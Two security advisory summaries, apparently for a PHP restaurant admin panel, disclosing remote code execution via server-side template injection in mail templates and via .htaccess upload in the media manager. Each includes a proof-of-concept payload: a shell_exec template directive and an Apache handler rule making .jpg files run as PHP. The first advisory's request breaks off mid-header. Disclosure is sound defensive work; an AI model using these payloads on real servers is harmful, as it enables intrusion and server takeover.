alerts.summary: ### Summary **Where:** `POST /admin/mail_templates/edit/{id}` → body field **Who can trigger:** Any admin user with `Admin.MailTemplates` permission **Impact:** Arbitrary PHP execution on the server  -  full RCE ### Details The Mail templates is vulnerable to SSTI and did not perform an validation and sanitization. ### PoC - login as admin - create new mail template with following command ``` @php echo shell_exec('echo "RCE Executed";id'); @endphp ``` - save the request - execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate` Request ```http POST /admin/mail_templates/edit/20 HTTP/1.1 Host: localhost:8888 Content-Length: 47 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" X-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY Accept-Language: en-US,en;q=0.9 sec-ch-ua: "Not-A.Brand";v

alerts.summary: ### Summary Media manager accepts `.htaccess` file which can be used to perform RCE. ### Details The file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE. ### PoC - Login as Admin - Create a `.htaccess` file with the following code. ``` <FilesMatch "\.jpg$"> SetHandler application/x-httpd-php </FilesMatch> ``` - Upload the `.htaccess` file via the Media Manager.
